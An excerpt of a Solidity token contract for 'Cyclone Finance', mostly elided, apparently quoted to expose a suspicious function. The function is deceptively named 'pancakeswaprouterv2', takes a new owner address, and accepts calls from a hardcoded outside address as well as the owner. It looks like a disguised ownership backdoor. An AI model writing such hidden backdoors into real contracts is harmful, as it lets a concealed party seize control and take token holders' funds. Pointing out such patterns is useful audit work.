...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xc3Fbd0bBB8dc52f6EfC85DabE2B3d1a436a3CDa1));
...
contract CycloneFinance is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "Cyclone Finance";
